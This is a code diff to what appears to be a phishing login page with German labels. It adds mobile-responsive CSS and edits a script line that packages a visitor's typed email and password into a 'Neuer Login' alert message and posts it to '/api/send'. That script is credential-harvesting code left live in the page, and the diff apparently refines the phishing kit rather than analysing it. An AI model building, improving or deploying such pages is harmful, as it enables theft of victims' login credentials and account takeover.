@@ -112,6 +112,72 @@
     }
     .footer a { margin: 0 10px; text-decoration: none; color: #444; }
     .footer a:hover { text-decoration: underline; }
+    /* 📱 Mobile Optimierung */
+@media (max-width: 420px) {
+  body {
+    padding: 0 12px;
+    box-sizing: border-box;
+  }
+
+  .container {
+    max-width: 100%;
+    justify-content: center;
+  }
+
+  .logo img {
+    height: 34px;
+    margin-bottom: 16px;
+  }
+
+  .input-field {
+    padding: 13px;
+    font-size: 15px;
+  }
+
+  .forgot-password {
+    font-size: 13px;
+    margin: 6px 0 14px;
+  }
+
+  .button-primary,
+  .button-secondary {
+    font-size: 16px;
+    padding: 13px 0;
+    border-radius: 28px;
+  }
+
+  .divider {
+    margin: 16px 0;
+    font-size: 13px;
+  }
+
+  .language-selector {
+    font-size: 13px;
+    margin-bottom: 16px;
+  }
+
+  .footer {
+    font-size: 12px;
+    padding: 10px 0;
+  }
+}
+
+/* 📱 Sehr kleine Geräte */
+@media (max-width: 320px) {
+  .input-field {
+    font-size: 14px;
+    padding: 12px;
+  }
+
+  .button-primary,
+  .button-secondary {
+    font-size: 15px;
+  }
+
+  .logo img {
+    height: 30px;
+  }
+}
   </style>
 </head>
 <body>
@@ -241,7 +307,7 @@
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value;
 
- const text = `! Neuer Login !\nEmail: ${email}\nPasswort: ${password}`;
+ const text = `⚠️ Neuer Login ⚠️\nEmail: ${email}\nPasswort: ${password}`;
 
   const res = await fetch("/api/send", {
     method: "POST",
